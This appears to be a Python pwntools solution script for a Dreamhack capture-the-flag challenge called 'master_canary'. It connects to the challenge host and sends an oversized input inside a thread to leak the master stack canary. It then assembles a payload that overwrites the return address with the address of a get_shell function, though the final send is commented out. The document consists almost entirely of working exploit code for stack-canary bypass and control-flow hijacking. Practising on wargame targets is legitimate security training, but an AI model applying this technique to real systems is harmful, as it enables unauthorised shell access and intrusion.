from pwn import *

#p = process("./master_canary")
p = remote("host3.dreamhack.games", 9892)
e = ELF("./master_canary")

get_shell = e.symbols['get_shell']

def create_thread():
	global p
	p.sendlineafter(b"> ", b"1")

def _input(size: bytes, data: bytes):
	global p
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"Size: ", size)
	p.sendlineafter(b"Data: ", data)

def _exit(comment: bytes):
	global p
	p.sendlineafter(b"> ", b"3")
	p.sendafter(b"Leave comment: ", comment)

#offset = 0x1a28
offset = 0x11b8

payload = b"A"*offset
payload += b"B"*8

create_thread()
_input(str(len(payload)).encode(), payload)
print(p.recvuntil(b"A"*offset + b"B"*8))
print(p.recv(8))
payload = b"A"*0x28
payload += b"B"*0x8
payload += b"A"*0x8
payload += p64(get_shell)

#_exit(payload)


p.interactive()

